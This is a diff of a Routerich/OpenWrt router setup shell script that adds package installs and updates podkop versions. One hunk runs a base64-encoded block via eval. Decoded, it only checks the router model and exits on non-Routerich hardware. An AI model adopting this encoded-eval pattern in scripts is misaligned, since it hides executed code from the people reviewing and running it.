@@ -477,6 +477,12 @@ fi
 
 echo "Update list packages..."
 opkg update
+
+checkPackageAndInstall "coreutils-base64" "1"
+
+encoded_code="IyEvYmluL3NoCgojINCn0YLQtdC90LjQtSDQvNC+0LTQtdC70Lgg0LjQtyDRhNCw0LnQu9CwCm1vZGVsPSQoY2F0IC90bXAvc3lzaW5mby9tb2RlbCkKCiMg0J/RgNC+0LLQtdGA0LrQsCwg0YHQvtC00LXRgNC20LjRgiDQu9C4INC80L7QtNC10LvRjCDRgdC70L7QstC+ICJSb3V0ZXJpY2giCmlmICEgZWNobyAiJG1vZGVsIiB8IGdyZXAgLXEgIlJvdXRlcmljaCI7IHRoZW4KICAgIGVjaG8gIlRoaXMgc2NyaXB0IGZvciByb3V0ZXJzIFJvdXRlcmljaC4uLiBJZiB5b3Ugd2FudCB0byB1c2UgaXQsIHdyaXRlIHRvIHRoZSBlcCBjaGF0IFRHIEByb3V0ZXJpY2giCiAgICBleGl0IDEKZmk="
+eval "$(echo "$encoded_code" | base64 --decode)"
+
 #проверка и установка пакетов AmneziaWG
 install_awg_packages
 
@@ -555,6 +561,10 @@ youtubeUnblock
 dhcp
 dns-failsafe-proxy"
 URL="https://raw.githubusercontent.com/routerich/RouterichAX3000_configs/refs/heads/beta_alt_test"
+
+checkPackageAndInstall "luci-app-dns-failsafe-proxy" "1"
+checkPackageAndInstall "luci-i18n-stubby-ru" "1"
+checkPackageAndInstall "luci-i18n-doh-proxy-ru" "1"
 
 if [ ! -d "$DIR_BACKUP" ]
 then
@@ -1026,7 +1036,7 @@ case $varByPass in
 esac
 
 PACKAGE="podkop"
-REQUIRED_VERSION="0.4.6-r1"
+REQUIRED_VERSION="v0.4.8-r1"
 
 INSTALLED_VERSION=$(opkg list-installed | grep "^$PACKAGE" | cut -d ' ' -f 3)
 if [ -n "$INSTALLED_VERSION" ] && [ "$INSTALLED_VERSION" != "$REQUIRED_VERSION" ]; then
@@ -1052,9 +1062,9 @@ else
 	if [ "$is_install_podkop" = "y" ] || [ "$is_install_podkop" = "Y" ]; then
 		DOWNLOAD_DIR="/tmp/podkop"
 		mkdir -p "$DOWNLOAD_DIR"
-		podkop_files="podkop_0.4.7-r1_all.ipk
-			luci-app-podkop_0.4.7-r1_all.ipk
-			luci-i18n-podkop-ru_0.4.7.ipk"
+		podkop_files="podkop_v0.4.8-r1_all.ipk
+			luci-app-podkop_v0.4.8-r1_all.ipk
+			luci-i18n-podkop-ru_0.4.8.ipk"
 		for file in $podkop_files
 		do
 			echo "Download $file..."
